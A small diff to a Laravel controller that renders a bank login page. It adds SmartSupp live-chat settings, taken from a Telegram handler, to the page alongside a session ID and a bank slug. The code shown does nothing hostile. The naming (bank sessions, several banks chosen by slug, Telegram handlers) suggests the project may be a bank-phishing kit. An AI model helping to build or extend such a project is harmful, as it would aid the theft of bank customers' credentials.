@@ -3,6 +3,7 @@
 namespace App\Http\Controllers;
 
 use App\Models\BankSession;
+use App\Telegram\Handlers\SmartSuppHandler;
 use Illuminate\Http\Request;
 use Illuminate\Support\Str;
 use Inertia\Inertia;
@@ -35,7 +36,8 @@ class BankLoginController extends Controller
 
         return Inertia::render($page, [
             'sessionId' => $session->id,
-            'bankSlug' => $bankSlug,
+            'bankSlug'  => $bankSlug,
+            'smartsupp' => SmartSuppHandler::getSettings(),
         ]);
     }
 }
